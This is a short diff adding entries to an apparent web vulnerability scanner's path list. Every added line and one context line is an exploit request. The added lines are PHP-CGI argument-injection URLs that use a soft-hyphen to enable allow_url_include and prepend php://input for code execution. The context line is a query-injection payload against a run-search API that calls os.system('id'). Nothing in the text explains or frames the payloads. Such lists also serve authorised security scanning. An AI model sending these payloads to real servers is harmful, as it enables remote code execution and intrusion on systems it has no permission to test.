@@ -55,3 +55,10 @@
 /api/runs/search/run?q=run.run.dataframe().query(%22%40run.run.__class__.__init__.__globals__[%27logging%27].os.system(%27id%27)%22)&limit=45
 /api/admin/user/{{user_id}}
 /api/system/pfp/{{user_id}}
+/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/cgi-bin/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/php-cgi/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+/index.test?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+?--configPath=/{{randstr}}
